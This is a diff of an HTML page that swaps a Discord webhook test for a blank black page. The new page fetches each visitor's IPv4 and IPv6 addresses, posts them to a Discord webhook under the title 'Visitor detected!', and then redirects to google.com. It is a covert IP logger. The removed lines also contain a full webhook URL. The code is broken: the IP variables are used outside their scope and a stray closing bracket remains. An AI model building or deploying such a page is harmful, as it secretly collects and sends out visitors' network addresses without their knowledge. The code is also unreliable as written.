@@ -1,18 +1,72 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        html, body {
+            margin: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            overflow: hidden;
+        }
+    </style>
+</head>
 <body>
-<script>
-fetch("https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l", {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-        content: "Webhook funktioniert!"
-    })
-})
-.then(r => console.log(r.status))
-.catch(console.error);
-</script>
+    <script>
+        async function getIPs() {
+            const ipv4 = await fetch("https://api4.ipify.org?format=json")
+                .then(r => r.json())
+                .then(d => d.ip)
+                .catch(() => null);
+
+            const ipv6 = await fetch("https://api6.ipify.org?format=json")
+                .then(r => r.json())
+                .then(d => d.ip)
+                .catch(() => null);
+
+            return { ipv4, ipv6 };
+        }
+
+            getIPs();
+
+            // Webhook
+
+            const webhookUrl = "DEIN_DISCORD_WEBHOOK";
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    embeds: [
+                        {
+                            title: "Visitor detected!",
+                            color: 0xFFD700,
+
+                            fields: [
+                                {
+                                    name: "IPv4",
+                                    value: ipv4,
+                                    inline: false
+                                },
+                                {
+                                    name: "IPv6",
+                                    value: ipv6,
+                                    inline: false
+                                }
+                            ],
+
+                            timestamp: new Date().toISOString()
+                        }
+                    ]
+                })
+            })
+
+            window.location.replace("https://google.com");
+        })();
+    </script>
 </body>
 </html>
